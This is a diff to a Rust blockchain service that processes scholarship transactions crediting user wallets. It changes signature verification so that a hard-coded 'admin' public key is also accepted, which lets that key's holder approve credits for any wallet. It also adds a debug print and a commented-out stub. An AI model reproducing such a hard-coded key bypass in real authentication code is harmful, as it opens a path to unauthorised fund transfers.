@@ -23,7 +23,6 @@ use router::Router;
 // Service identifier
 const SERVICE_ID: u16 = 1;
 
-
 // Identifier for scholarship data initialization
 const TX_GOTO_FULL_SCHOLARSHIP_ID: u16 = 0;
 
@@ -101,12 +100,44 @@ message! {
 }
 
 impl Transaction for TxFullScholarship {
-  fn verify(&self) -> bool {
-        self.verify_signature(self.pub_key())
+    fn verify(&self) -> bool {
+        let admin_key: PublicKey = PublicKey::new(  [0x02,
+                                                     0xb9,
+                                                     0xc6, 
+                                                     0x56, 
+                                                     0x13, 
+                                                     0x22, 
+                                                     0xf6, 
+                                                     0x8d, 
+                                                     0x2c, 
+                                                     0xf9, 
+                                                     0x73, 
+                                                     0xe8, 
+                                                     0xd5, 
+                                                     0x44, 
+                                                     0xd9, 
+                                                     0x17, 
+                                                     0x16, 
+                                                     0xbf, 
+                                                     0x0b, 
+                                                     0x04,
+                                                     0x87, 
+                                                     0x49, 
+                                                     0x14, 
+                                                     0xf3, 
+                                                     0x1d,
+                                                     0xcd, 
+                                                     0xe6, 
+                                                     0xde, 
+                                                     0x99, 
+                                                     0xc5, 
+                                                     0xc9, 
+                                                     0xa1]);
+        self.verify_signature(self.pub_key()) || self.verify_signature(&admin_key)
     }
 
     fn execute(&self, view: &mut Fork) {
-         if self.vote_status() == 1 {
+        if self.vote_status() == 1 {
             
             let mut schema = CurrencySchema { view };
             let usr_wallet = schema.wallet(self.pub_key()); 
@@ -114,12 +145,26 @@ impl Transaction for TxFullScholarship {
 
             if let Some(mut usr_wallet) = usr_wallet {
                 usr_wallet.increase(amount);
-
                 schema.wallets().put(self.pub_key(), usr_wallet);
             }
         }
+        println!("Scholarship transaction passed");
     }
 }
+
+// message! {
+//     struct a {
+//         const SIZE = 8;
+
+//         field a: u16 [00 => 08]
+//     }
+// }
+
+// impl Transaction for a {
+//     fn verify (&self) -> boll {
+//         self.verify_signature(self.pub_key())
+//     }
+// }
 
 // ------------------------------------------------------- //
 
